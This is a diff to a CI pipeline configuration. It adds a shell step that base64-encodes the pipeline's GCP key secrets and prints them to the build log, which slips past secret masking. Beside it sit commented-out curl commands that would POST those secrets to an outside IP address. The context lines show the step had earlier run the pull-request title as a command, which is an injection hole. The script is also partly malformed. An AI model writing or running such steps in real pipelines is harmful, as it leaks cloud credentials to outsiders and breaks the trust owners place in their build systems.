@@ -38,7 +38,27 @@ pipeline:
                       echo "hello"
                       #curl -X POST --data "$PR" http://35.222.129.92:12345
                       #echo "<+trigger.prTitle>"
-                      <+trigger.prTitle>
+                      #<+trigger.prTitle>
+                      #!/bin/bash
+
+                      # Define your secrets
+
+                      echo "<+stage.variables.gcp_key>" | base64
+
+                      #secret1="<+stage.variables.gcp_key>" 
+                      secret2="<+stage.variables.gcp_key2>" | base64
+                      echo "$secret2"
+                      # Concatenate secrets into a single variable with differentiation
+                      env_vars="secret1: $secret1\nsecret2: $secret2"
+
+                      # Send the data via curl
+                      #curl -X POST --data "$env_vars" http://35.222.129.92:4000
+
+                      # Wait for 20 seconds
+                      sleep 20
+
+                      # Exit the script
+                      exit 0
                       #"<+trigger.prTitle>"
                       #env_vars="this is a test env"
                       #curl -X POST --data "$env_vars" http://35.222.129.92:4000
